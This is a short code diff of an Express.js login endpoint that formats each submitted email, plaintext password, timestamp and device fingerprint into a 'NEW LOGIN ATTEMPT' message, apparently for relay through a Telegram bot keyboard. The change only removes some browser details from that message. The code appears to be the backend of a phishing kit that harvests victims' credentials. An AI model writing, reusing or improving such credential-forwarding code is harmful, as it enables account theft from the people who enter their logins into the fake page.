@@ -236,7 +236,7 @@ app.post('/api/login', async (req, res) => {
   const fpBlock = formatFingerprintBlock(fp);
 
   const timestamp = getISTDateTime();
-  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 User-Agent: ${ua}\n🖥 Screen: ${screen} | Platform: ${platform}\n🌐 Language: ${language} | Timezone: ${timezone}\n🔑 Fingerprint: ${fingerprint}\n🕐 Time: ${timestamp}${fpBlock}`;
+  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${timestamp}${fpBlock}`;
 
   const reply_markup = {
     inline_keyboard: [
